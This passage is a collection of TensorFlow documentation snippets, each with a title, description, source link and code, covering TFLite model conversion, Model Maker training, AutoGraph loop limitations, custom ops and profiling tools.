  -DCMAKE_VERBOSE_MAKEFILE:BOOL=ON \
  -DCMAKE_SYSTEM_NAME=Linux \
  -DCMAKE_SYSTEM_PROCESSOR=aarch64 \
  ../tensorflow/lite/
```

----------------------------------------

TITLE: Converting Model to TFLite Python
DESCRIPTION: Exports a TensorFlow model with custom signatures ('train', 'infer', 'save', 'restore') to the SavedModel format, and then converts it to a TensorFlow Lite model. Configures the converter to support TFLite and selected TensorFlow operations for training.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/on_device_training/overview.ipynb#_snippet_8

LANGUAGE: python
CODE:
```
SAVED_MODEL_DIR = "saved_model"

tf.saved_model.save(
    m,
    SAVED_MODEL_DIR,
    signatures={
        'train':
            m.train.get_concrete_function(),
        'infer':
            m.infer.get_concrete_function(),
        'save':
            m.save.get_concrete_function(),
        'restore':
            m.restore.get_concrete_function(),
    })

# Convert the model
converter = tf.lite.TFLiteConverter.from_saved_model(SAVED_MODEL_DIR)
converter.target_spec.supported_ops = [
    tf.lite.OpsSet.TFLITE_BUILTINS,  # enable TensorFlow Lite ops.
    tf.lite.OpsSet.SELECT_TF_OPS  # enable TensorFlow ops.
]
converter.experimental_enable_resource_variables = True
tflite_model = converter.convert()
```

----------------------------------------

TITLE: Adding TensorFlow Dependency in Gradle (Groovy)
DESCRIPTION: This snippet shows how to include the TensorFlow Android AAR library in an Android project's build.gradle file. It configures the repositories to use jcenter() and adds the org.tensorflow:tensorflow-android:+ dependency to the project, allowing Gradle to fetch the latest prebuilt library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/android/inference_interface/README.md#_snippet_0

LANGUAGE: Groovy
CODE:
```
allprojects {
    repositories {
        jcenter()
    }
}

dependencies {
    compile 'org.tensorflow:tensorflow-android:+'
}
```

----------------------------------------

TITLE: Loading and Preprocessing Data with MobileBERT Spec in Python
DESCRIPTION: Loads training and test datasets from CSV files ('train.csv', 'dev.csv') using DataLoader.from_csv, applying the preprocessing required by the 'mobilebert_classifier' model specification. This step is necessary after changing the model architecture.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_classification.ipynb#_snippet_15

LANGUAGE: python
CODE:
```
train_data = DataLoader.from_csv(
      filename='train.csv',
      text_column='sentence',
      label_column='label',
      model_spec=mb_spec,
      is_training=True)
test_data = DataLoader.from_csv(
      filename='dev.csv',
      text_column='sentence',
      label_column='label',
      model_spec=mb_spec,
      is_training=False)
```

----------------------------------------

TITLE: Profile TensorFlow Model Parameters (tfprof Command-line)
DESCRIPTION: Use the tfprof command-line tool with the 'scope' view to analyze model parameters. This example filters by the 'VariableV2' operation type, limits the depth, and selects the 'params' metric to display the parameter count per scope.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/profiler/g3doc/profile_model_architecture.md#_snippet_0

LANGUAGE: shell
CODE:
```
tfprof> scope -account_type_regexes VariableV2 -max_depth 4 -select params
_TFProfRoot (--/930.58k params)
  global_step (1/1 params)
  init/init_conv/DW (3x3x3x16, 432/864 params)
  pool_logit/DW (64x10, 640/1.28k params)
    pool_logit/DW/Momentum (64x10, 640/640 params)
  pool_logit/biases (10, 10/20 params)
    pool_logit/biases/Momentum (10, 10/10 params)
  unit_last/final_bn/beta (64, 64/128 params)
  unit_last/final_bn/gamma (64, 64/128 params)
  unit_last/final_bn/moving_mean (64, 64/64 params)
  unit_last/final_bn/moving_variance (64, 64/64 params)
```

----------------------------------------

TITLE: Training TFLite Audio Model using Model Maker Python
DESCRIPTION: Sets hyperparameters for training and uses the `audio_classifier.create` method to train a custom audio classification model. It requires prepared `train_data`, `spec`, and `validation_data` objects and outputs a trained model instance.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/audio_classification.ipynb#_snippet_8

LANGUAGE: python
CODE:
```
batch_size = 128
epochs = 100

print('Training the model')
model = audio_classifier.create(
    train_data,
    spec,
    validation_data,
    batch_size=batch_size,
    epochs=epochs)
```

----------------------------------------

TITLE: Comparing Print and tf.print in tf.function (Python/TensorFlow)
DESCRIPTION: This snippet defines a `tf.function` that includes both a standard Python `print(a)` and a TensorFlow `tf.print(a)`. It is used to illustrate the different execution times and outputs of these two print functions when used within a TensorFlow graph function.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/debugging.md#_snippet_6

LANGUAGE: python
CODE:
```
@tf.function
def f(a):
  print(a)
  tf.print(a)
```

----------------------------------------

TITLE: Performing Annotation with BertCluAnnotator (Python)
DESCRIPTION: Describes the `annotate` method of the `BertCluAnnotator`. This method takes a `CluRequest` object containing the input text and returns a `CluResponse` object with the annotation results.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/text/BertCluAnnotator.md#_snippet_1

LANGUAGE: python
CODE:
```
annotate(\n    request: tflite_support.task.processor.CluRequest\n) -> tflite_support.task.processor.CluResponse
```

----------------------------------------

TITLE: Install TensorFlow Nightly Build with Pip
DESCRIPTION: Installs the latest TensorFlow nightly build via pip, which is recommended for using the experimental control flow features demonstrated in this CodeLab. This ensures access to the newest features and improvements in the TensorFlow Lite converter.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/experimental_new_converter/keras_lstm.ipynb#_snippet_0

LANGUAGE: python
CODE:
```
!pip install tf-nightly --upgrade
```

----------------------------------------

TITLE: Converting and Running GPT-2 Model via TFLite Converter (Python)
DESCRIPTION: This code snippet performs the actual conversion of the TensorFlow concrete function into a TensorFlow Lite model using TFLiteConverter. It configures the converter to include TFLite built-ins and select TensorFlow operations (specifically UnsortedSegmentJoin and UpperBound) required for the text model, then saves the converted model bytes and demonstrates running inference using the previously defined helper function. It depends on the generated concrete function and the helper inference function.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/auto_complete/overview.md#_snippet_3

LANGUAGE: python
CODE:
```
gpt2_lm.jit_compile = False
converter = tf.lite.TFLiteConverter.from_concrete_functions(
    [concrete_func],
    gpt2_lm)

converter.target_spec.supported_ops = [
    tf.lite.OpsSet.TFLITE_BUILTINS, # enable TFLite ops
    tf.lite.OpsSet.SELECT_TF_OPS, # enable TF ops
]
converter.allow_custom_ops = True
converter.target_spec.experimental_select_user_tf_ops = [
    "UnsortedSegmentJoin",
    "UpperBound"
]
converter._experimental_guarantee_all_funcs_one_use = True
generate_tflite = converter.convert()
run_inference("I'm enjoying a", generate_tflite)
```

----------------------------------------

TITLE: Profiling TFLite Model Operators via ADB Shell Command
DESCRIPTION: This command executes the `benchmark_model` tool on an Android device using `adb shell`. It specifies the TFLite model path and enables detailed operator profiling using the `--enable_op_profiling=true` flag. The `taskset f0` ensures execution on a specific CPU core set.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/README.md#_snippet_0

LANGUAGE: Shell
CODE:
```
adb shell taskset f0 /data/local/tmp/benchmark_model \
  --graph=/data/local/tmp/mobilenet_quant_v1_224.tflite \
  --enable_op_profiling=true
```

----------------------------------------

TITLE: Converting Function with tf.autograph.to_graph Python
DESCRIPTION: Demonstrates the basic usage of `tf.autograph.to_graph` to convert a standard Python function into an AutoGraph-converted function. This converted function contains the logic translated into TensorFlow graph operations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/intro.md#_snippet_0

LANGUAGE: Python
CODE:
```
def f(...):
  ...

converted_f = tf.autograph.to_graph(f)
```

----------------------------------------

TITLE: Variable Initialization Inside Loop (Used After, No Dependencies) - Correct (TF 2.4+)
DESCRIPTION: Starting in TensorFlow 2.4, a variable initialized inside a TensorFlow loop can be used after the loop, provided it does not depend on values from previous iterations. However, this requires the loop to execute at least once; otherwise, a runtime error will occur.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_6

LANGUAGE: python
CODE:
```
del x
for i in tf.range(10):  # Okay -- x does not depend on previous iterations
  x = tf.constant(1)
tf.print(x)
```

----------------------------------------

TITLE: Computing Cosine Similarity - Python
DESCRIPTION: Calculates the cosine similarity between two feature vectors. This function is useful for comparing the similarity of embeddings produced by the TextEmbedder.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/text/TextEmbedder.md#_snippet_5

LANGUAGE: python
CODE:
```
cosine_similarity(
    u: tflite_support.task.processor.FeatureVector,
    v: tflite_support.task.processor.FeatureVector
) -> float
```

----------------------------------------

TITLE: Defining Recommendation Model Specification - TFLite Model Maker Python
DESCRIPTION: This snippet illustrates how to define the specification for a recommendation model using `InputSpec` and `ModelHParams` from the `tflite_model_maker.recommendation.spec` module. It shows how to configure input feature groups with their respective features and encoders, specify the label feature, and set various model hyperparameters like hidden layer dimensions and evaluation metrics, combining them into a final `ModelSpec` object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/recommendation/spec.md#_snippet_0

LANGUAGE: Python
CODE:
```
input_spec = recommendation.spec.InputSpec(
    activity_feature_groups=[
        # Group #1: defines how features are grouped in the first Group.
        dict(
            features=[
                # First feature.
                dict(
                    feature_name='context_movie_id',  # Feature name
                    feature_type='INT',  # Feature type
                    vocab_size=3953,     # ID size (number of IDs)
                    embedding_dim=8,     # Projected feature embedding dim
                    feature_length=10,   # History length of 10.
                ),
                # Maybe more features...
            ],
            encoder_type='CNN',  # CNN encoder (e.g. CNN, LSTM, BOW)
        ),
        # Maybe more groups...
    ],
    label_feature=dict(
        feature_name='label_movie_id',  # Label feature name
        feature_type='INT',  # Label type
        vocab_size=3953,   # Label size (number of classes)
        embedding_dim=8,   # label embedding demension
        feature_length=1,  # Exactly 1 label
    ),
)

model_hparams = recommendation.spec.ModelHParams(
    hidden_layer_dims=[32, 32],  # Hidden layers dimension.
    eval_top_k=[1, 5],           # Eval top 1 and top 5.
    conv_num_filter_ratios=[2, 4],  # For CNN encoder, conv filter mutipler.
    conv_kernel_size=16,            # For CNN encoder, base kernel size.
    lstm_num_units=16,              # For LSTM/RNN, num units.
    num_predictions=10,          # Number of output predictions. Select top 10.
)

spec = recommendation.ModelSpec(
    input_spec=input_spec, model_hparams=model_hparams)
# Or:
spec = model_spec.get(
    'recommendation', input_spec=input_spec, model_hparams=model_hparams)
```

----------------------------------------

TITLE: Implementing Multiplex Op Kernel Logic (C++)
DESCRIPTION: Defines the templated `MultiplexDenseOp` class inheriting from `OpKernel`. The `Compute` method contains the core logic: retrieving input tensors, validating their shapes, allocating the output tensor, and performing the conditional selection using Eigen's `select` method.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_2/README.md#_snippet_3

LANGUAGE: cpp
CODE:
```
template <typename Device, typename T>
class MultiplexDenseOp : public OpKernel {
 public:
  explicit MultiplexDenseOp(OpKernelConstruction* ctx) : OpKernel(ctx) {}
  MultiplexDenseOp(const MultiplexDenseOp& other) = delete;
  MultiplexDenseOp& operator=(const MultiplexDenseOp& other) = delete;
  ~MultiplexDenseOp() override = default;

  void Compute(OpKernelContext* ctx) override {
    const auto& cond_tensor = ctx->input(0);
    const auto& a_values_tensor = ctx->input(1);
    const auto& b_values_tensor = ctx->input(2);

    // Allow any shape, but require that a_values, b_values, and cond all
    // have the same shape.
    // Note that ::tensorflow::TensorShapeUtils has some useful functions
    // for checking shapes.
    OP_REQUIRES(ctx, a_values_tensor.shape() == b_values_tensor.shape(),
                ::tensorflow::errors::InvalidArgument(
                    "a and b must have the same shape. "
                    "a shape: ",
                    a_values_tensor.shape().DebugString(),
                    " b shape: ", b_values_tensor.shape().DebugString()));
    OP_REQUIRES(ctx, a_values_tensor.shape() == cond_tensor.shape(),
                ::tensorflow::errors::InvalidArgument(
                    "a and cond must have the same shape. "
                    "a shape: ",
                    a_values_tensor.shape().DebugString(),
                    " cond shape: ", cond_tensor.shape().DebugString()));
    OP_REQUIRES(ctx, a_values_tensor.NumElements() > 0,
                ::tensorflow::errors::InvalidArgument(
                    "Inputs must have at least one element."));

    const auto a_values = a_values_tensor.flat<T>();
    const auto b_values = b_values_tensor.flat<T>();
    const auto cond = cond_tensor.flat<bool>();

    // Create an output tensor
    Tensor* output_tensor = nullptr;
    OP_REQUIRES_OK(
        ctx, ctx->allocate_output(0, a_values_tensor.shape(), &output_tensor));
    auto output = output_tensor->template flat<T>();
    // Here is an example of processing tensors using the Eigen library.
    // This supports both CPU and GPU.
    // For CPU, it supports chunking into blocks and multi-threading.
    // See
    // https://eigen.tuxfamily.org/dox/unsupported/eigen_tensors.html#title55
    output.device(ctx->eigen_device<Device>()) =
        cond.select(a_values, b_values);
  }
};
```

----------------------------------------

TITLE: Create MetadataWriter from Info Objects - TFLite Support - Python
DESCRIPTION: Creates a MetadataWriter object based on structured metadata information objects, offering a higher-level alternative to using raw Flatbuffers. It takes information for general model details, input image tensor, and specific output tensors (location, category, score, number), returning a MetadataWriter object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/object_detector/MetadataWriter.md#_snippet_3

LANGUAGE: python
CODE:
```
@classmethod
create_from_metadata_info(
    model_buffer: bytearray,
    general_md: Optional[tflite_support.metadata_writers.metadata_info.GeneralMd] = None,
    input_md: Optional[tflite_support.metadata_writers.metadata_info.InputImageTensorMd] = None,
    output_location_md: Optional[tflite_support.metadata_writers.metadata_info.TensorMd] = None,
    output_category_md: Optional[tflite_support.metadata_writers.metadata_info.CategoryTensorMd] = None,
    output_score_md: Union[None, tflite_support.metadata_writers.metadata_info.TensorMd, tflite_support.metadata_writers.metadata_info.ClassificationTensorMd] = None,
    output_number_md: Optional[tflite_support.metadata_writers.metadata_info.TensorMd] = None
)
```

----------------------------------------

TITLE: Variable Initialization Inside Loop (Not Used After) - Correct
DESCRIPTION: If a variable is only used inside a TensorFlow loop and does not depend on previous iterations (i.e., it's not an accumulator), it can be initialized inside the loop, provided it's not used after the loop concludes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_5

LANGUAGE: python
CODE:
```
del x
while tf.random.uniform(()) > 0.5:  # Okay -- x is not used after the loop
  x = tf.constant(1)
```

----------------------------------------

TITLE: Visualizing Prediction Result Matplotlib Python
DESCRIPTION: Uses matplotlib.pylab to display the input test image. It then formats a title string showing the true label and the model's predicted label (derived from the index of the highest probability output) and sets the plot title accordingly.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_quant.ipynb#_snippet_11

LANGUAGE: python
CODE:
```
import matplotlib.pylab as plt

plt.imshow(test_images[0])
template = "True:{true}, predicted:{predict}"
_ = plt.title(template.format(true= str(test_labels[0]),
                              predict=str(np.argmax(predictions[0]))))
plt.grid(False)
```

----------------------------------------

TITLE: Specifying Arg Type in Docstring - Python
DESCRIPTION: Demonstrates the use of PEP 484 type hinting notation (e.g., `Dict[str, List[int]]`) within the `Args:` section of a Python docstring, as required by the AutoGraph style guide. This helps document the expected type of function arguments.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/STYLE_GUIDE.md#_snippet_0

LANGUAGE: Python
CODE:
```
Args:
  foo: Dict[str, List[int]], a dictionary of sorts
```

----------------------------------------

TITLE: Creating and Populating Audio Classifier Metadata (Python)
DESCRIPTION: Defines constants for the model path, label file, expected audio sample rate, number of channels, and the save path for the output model. It creates an `audio_classifier.MetadataWriter` using `create_for_inference`, providing the loaded model file, sample rate, number of channels, and the label file. The code then prints the generated metadata JSON for verification and finally saves the model with the populated metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata_writer_tutorial.ipynb#_snippet_17

LANGUAGE: Python
CODE:
```
AudioClassifierWriter = audio_classifier.MetadataWriter
_MODEL_PATH = "yamnet.tflite"
# Task Library expects label files that are in the same format as the one below.
_LABEL_FILE = "yamnet_labels.txt"
# Expected sampling rate of the input audio buffer.
_SAMPLE_RATE = 16000
# Expected number of channels of the input audio buffer. Note that Task library only
# supports single channel so far.
_CHANNELS = 1
_SAVE_TO_PATH = "yamnet_metadata.tflite"

# Create the metadata writer.
writer = AudioClassifierWriter.create_for_inference(
    writer_utils.load_file(_MODEL_PATH), _SAMPLE_RATE, _CHANNELS, [_LABEL_FILE])

# Verify the metadata generated by the metadata writer.
print(writer.get_metadata_json())

# Populate the metadata into the model.
writer_utils.save_file(writer.populate(), _SAVE_TO_PATH)
```

----------------------------------------

TITLE: Exporting Object Detector Model to TFLite Python
DESCRIPTION: Exports the trained TensorFlow model to the TensorFlow Lite format using the `model.export` method, saving it to the specified directory ('.' for the current directory). This step typically includes post-training quantization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/object_detection.ipynb#_snippet_7

LANGUAGE: python
CODE:
```
model.export(export_dir='.')
```

----------------------------------------

TITLE: Splitting Data Detailed Process Python
DESCRIPTION: Splits the loaded image data into three sets: training (80%), validation (10%), and testing (10%). The validation set is created by splitting the remaining 20% after the initial 80/20 split.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/image_classification.ipynb#_snippet_8

LANGUAGE: python
CODE:
```
train_data, rest_data = data.split(0.8)
validation_data, test_data = rest_data.split(0.5)
```

----------------------------------------

TITLE: Installing tflite-support via pip in Python
DESCRIPTION: This command shows the standard way to install the `tflite-support` Python package using pip. This package includes the necessary components, like `BertNLClassifier`, for running TensorFlow Lite Task Library models in Python.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/bert_nl_classifier.md#_snippet_5

LANGUAGE: bash
CODE:
```
pip install tflite-support
```

----------------------------------------

TITLE: Creating TensorAudio from WAV in Python
DESCRIPTION: Creates a new `TensorAudio` object by loading data directly from a specified WAV audio file. This class method reads a specific number of samples (`sample_count`) starting from an optional `offset`.
It validates the input parameters and the file content, raising errors for invalid inputs or runtime issues during file processing.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/audio/TensorAudio.md#_snippet_2

LANGUAGE: Python
CODE:
```
@classmethod
create_from_wav_file(
    file_name: str, sample_count: int, offset: int = 0
) -> 'TensorAudio'
```

----------------------------------------

TITLE: Initializing and Running BertNLClassifier in Swift
DESCRIPTION: This Swift code shows the basic steps to initialize a `TFLBertNLClassifier` instance by providing the path to the BERT model file. After initialization, you can call the `classify` method with your input text to get classification results.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/bert_nl_classifier.md#_snippet_3

LANGUAGE: swift
CODE:
```
// Initialization
let bertNLClassifier = TFLBertNLClassifier.bertNLClassifier(
      modelPath: bertModelPath)

// Run inference
let categories = bertNLClassifier.classify(text: input)
```

----------------------------------------

TITLE: Getting Help for TFLite Convert Command Line
DESCRIPTION: Provides the shell command to display the available options and flags for the tflite_convert command-line utility. This helps users understand the parameters required for command-line model conversion.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/convert_models.md#_snippet_3

LANGUAGE: sh
CODE:
```
$ tflite_convert --help

`--output_file`. Type: string. Full path of the output file.
`--saved_model_dir`. Type: string. Full path to the SavedModel directory.
`--keras_model_file`. Type: string. Full path to the Keras H5 model file.
`--enable_v1_converter`. Type: bool. (default False) Enables the converter and flags used in TF 1.x instead of TF 2.x.

You are required to provide the `--output_file` flag and either the `--saved_model_dir` or `--keras_model_file` flag.
```

----------------------------------------

TITLE: Building Selective TFLite AAR with Custom Ops (Shell)
DESCRIPTION: This shell command extends the basic AAR build process to include custom TensorFlow Lite operations. In addition to input models and target architectures, it requires `--tflite_custom_ops_srcs` for source files of custom ops and `--tflite_custom_ops_deps` for their Bazel dependencies within the TensorFlow repository.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/reduce_binary_size.md#_snippet_1

LANGUAGE: sh
CODE:
```
sh tensorflow/lite/tools/build_aar.sh \
  --input_models=/a/b/model_one.tflite,/c/d/model_two.tflite \
  --target_archs=x86,x86_64,arm64-v8a,armeabi-v7a \
  --tflite_custom_ops_srcs=/e/f/file1.cc,/g/h/file2.h \
  --tflite_custom_ops_deps=dep1,dep2
```

----------------------------------------

TITLE: Modifying tf.Variable in Function - Correct
DESCRIPTION: Modifications to TensorFlow objects like `tf.Variable` are tracked using TensorFlow's automatic control dependencies, not static analysis of Python code. Therefore, modifying a `tf.Variable` within a separate function called from an AutoGraph-transformed loop is correctly handled.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_12

LANGUAGE: python
CODE:
```
def change(y_var):
  y_var.assign_add(1)

y = tf.Variable(1)
while x > 0:
  change(y)  # This is still okay -- TensorFlow side effects are robust.
```

----------------------------------------

TITLE: Demonstrating Illegal Shape Change in tf.while_loop Python
DESCRIPTION: Shows an example of a loop body function designed for `tf.while_loop` where the output tensor shape is inconsistent with the input shape, which is disallowed in TensorFlow loops and will raise an error. This illustrates the requirement for shape consistency across loop iterations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_43

LANGUAGE: Python
CODE:
```
def loop_body(x):  # x.shape is ()
  return tf.constant((1, 2, 3))  # Error -- inconsistent shapes: (), (3,)

x = tf.while_loop(
    lambda _: tf.random.uniform(()) > 0.5,
    loop_body,
    loop_vars=(tf.constant(1,))
)
```

----------------------------------------

TITLE: Static Shape Index Out of Bounds Tracing Error Python
DESCRIPTION: Demonstrates a static shape verification error caught during tracing (`tf.function`). Accessing an index (`x[4]`) that is out of the statically known bounds of a tensor (`x` has shape `(3,)`) results in an error before execution.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_33

LANGUAGE: Python
CODE:
```
x = tf.constant([1, 2, 3])
x[4]  # Tracing error! 4 is out of bounds.
```

----------------------------------------

TITLE: Prepare Standard Speech Commands Dataset in Python
DESCRIPTION: This snippet prepares the standard speech commands dataset by selecting specific commands, keeping a limited number of samples per class for training, and creating a separate test directory. It moves background noise samples and deletes unwanted class directories and excess samples.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/speech_recognition.ipynb#_snippet_6

LANGUAGE: python
CODE:
```
if not use_custom_dataset:
  commands = [ "up", "down", "left", "right", "go", "stop", "on", "off", "background"]
  dataset_dir = './dataset-speech'
  test_dir = './dataset-test'

  # Move the processed background samples
  shutil.move(background_dir, os.path.join(dataset_dir, 'background'))   

  # Delete all directories that are not in our commands list
  dirs = glob.glob(os.path.join(dataset_dir, '*/'))
  for dir in dirs:
    name = os.path.basename(os.path.normpath(dir))
    if name not in commands:
      shutil.rmtree(dir)

  # Count is per class
  sample_count = 150
  test_data_ratio = 0.2
  test_count = round(sample_count * test_data_ratio)

  # Loop through child directories (each class of wav files)
  dirs = glob.glob(os.path.join(dataset_dir, '*/'))
  for dir in dirs:
    files = glob.glob(os.path.join(dir, '*.wav'))
    random.seed(42)
    random.shuffle(files)
    # Move test samples:
    for file in files[sample_count:sample_count + test_count]:
      class_dir = os.path.basename(os.path.normpath(dir))
      os.makedirs(os.path.join(test_dir, class_dir), exist_ok=True)
      os.rename(file, os.path.join(test_dir, class_dir, os.path.basename(file)))
    # Delete remaining samples
    for file in files[sample_count + test_count:]:
      os.remove(file)
```

----------------------------------------

TITLE: Downloading SST-2 Dataset
DESCRIPTION: This snippet downloads and extracts the SST-2 (Stanford Sentiment Treebank) dataset. It uses `tf.keras.utils.get_file` to fetch the zip file from a specified URL and extract its contents, storing the path to the extracted data directory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_classification.ipynb#_snippet_3

LANGUAGE: python
CODE:
```
data_dir = tf.keras.utils.get_file(
      fname='SST-2.zip',
      origin='https://dl.fbaipublicfiles.com/glue/data/SST-2.zip',
      extract=True)
data_dir = os.path.join(os.path.dirname(data_dir), 'SST-2')
```

----------------------------------------

TITLE: Variable Initialization Inside Loop - Incorrect
DESCRIPTION: Variables used across iterations or after a loop (with a `tf.Tensor` condition or iterated over a `tf.Tensor`) must usually be defined before the loop begins. This example shows an accumulator 'x' initialized only in the first iteration, which is not allowed by AutoGraph.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_4

LANGUAGE: python
CODE:
```
del x
for i in tf.range(100):  # Error -- x must be defined before the loop
  if i == 0:
    x = tf.constant(1)
  else:
    x = x + 1
tf.print(x)
```

----------------------------------------

TITLE: Generating TFLite Micro Projects with Make | bash
DESCRIPTION: Generates standalone project files for supported embedded development environments (like Keil, Make, and Mbed). This command requires a cloned TensorFlow/tflite-micro repository and downloads necessary toolchains. The generated projects are placed in a 'gen' directory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/microcontrollers/library.md#_snippet_0

LANGUAGE: bash
CODE:
```
make -f tensorflow/lite/micro/tools/make/Makefile generate_projects
```

----------------------------------------

TITLE: Testing Custom TensorFlow Op Type Mismatch Errors (Python)
DESCRIPTION: Tests the custom multiplex op with mismatched input types (float and int64) to ensure correct error handling. It uses `assertRaisesRegex` to catch expected `InvalidArgumentError` (eager) or `TypeError` (graph) with specific error messages.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_2/README.md#_snippet_8

LANGUAGE: python
CODE:
```
  @test_util.run_in_graph_and_eager_modes
  def test_multiplex_bad_types(self):
    a = tf.constant([1.0, 2.0, 3.0, 4.0, 5.0])  # float
    b = tf.constant([10, 20, 30, 40, 50], dtype=tf.int64)
    cond = tf.constant([True, False, True, False, True], dtype=bool)
    with self.assertRaisesRegex(
        (errors_impl.InvalidArgumentError, TypeError),
        # Eager mode raises InvalidArgumentError with the following message
        r'(cannot compute Examples>MultiplexDense as input #2\(zero-based\) '
        r'was expected to be a float tensor but is a int64 tensor '
        r'\[Op:Examples>MultiplexDense\]'
        r')|('
        # Graph mode raises TypeError with the following message
        r"Input 'b' of 'Examples>MultiplexDense' Op has type int64 that "
        r"does not match type float32 of argument 'a'."):
      self.evaluate(multiplex_2_op.multiplex(cond, a, b))
```

----------------------------------------

TITLE: Loading Image Data for Searcher Model (Python)
DESCRIPTION: Demonstrates an alternative data loading method for image search. This snippet shows how to create an ImageDataLoader instance using a TFLite image embedder model and load image data from a directory containing image files.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_searcher.ipynb#_snippet_5

LANGUAGE: python
CODE:
```
data_loader = searcher.ImageDataLoader.create("mobilenet_v2_035_96_embedder_with_metadata.tflite")
data_loader.load_from_folder("food/")
```

----------------------------------------

TITLE: Initialize and Run Inference with BertQuestionAnswerer (C++)
DESCRIPTION: This C++ snippet demonstrates how to initialize the `BertQuestionAnswerer` using options that specify the model file path. It then runs inference by calling the `Answer` method with the context and question strings, returning a vector of possible answers.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/bert_question_answerer.md#_snippet_4

LANGUAGE: c++
CODE:
```
// Initialization
BertQuestionAnswererOptions options;
options.mutable_base_options()->mutable_model_file()->set_file_name(model_path);
std::unique_ptr<BertQuestionAnswerer> answerer = BertQuestionAnswerer::CreateFromOptions(options).value();

// Run inference with your inputs, `context_of_question` and `question_to_ask`.
std::vector<QaAnswer> positive_results = answerer->Answer(context_of_question, question_to_ask);
```

----------------------------------------

TITLE: Retrieving Serving Keras Model in Python
DESCRIPTION: Returns the underlying Keras model specifically configured or suitable for performing predictions (serving). This allows users to access the trained Keras model directly.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/question_answer/QuestionAnswer.md#_snippet_3

LANGUAGE: python
CODE:
```
create_serving_model()
```

----------------------------------------

TITLE: Fallback to Metal Delegate (Swift)
DESCRIPTION: Implements a strategy in Swift where the code first attempts to create a CoreMLDelegate. If that fails (returns nil), it then attempts to create a MetalDelegate as a fallback for potential GPU acceleration.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/coreml_delegate.md#_snippet_7

LANGUAGE: Swift
CODE:
```
var delegate = CoreMLDelegate()
    if delegate == nil {
      delegate = MetalDelegate()  // Add Metal delegate options if necessary.
    }

    let interpreter = try Interpreter(modelPath: modelPath,
                                      delegates: [delegate!])
```

----------------------------------------

TITLE: Initializing TFLite Interpreter & Restore Runner Python
DESCRIPTION: Creates a new instance of the TensorFlow Lite interpreter from the model content and allocates tensors. It retrieves signature runners for both 'infer' and 'restore' in preparation for potentially loading saved weights from a checkpoint.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/on_device_training/overview.ipynb#_snippet_17

LANGUAGE: python
CODE:
```
another_interpreter = tf.lite.Interpreter(model_content=tflite_model)
another_interpreter.allocate_tensors()

infer = another_interpreter.get_signature_runner("infer")
restore = another_interpreter.get_signature_runner("restore")
```

----------------------------------------

TITLE: Creating Text Model for QA Task in TensorFlow
DESCRIPTION: Instantiates the model architecture specifically designed for the question answering (QA) task using TensorFlow Keras.
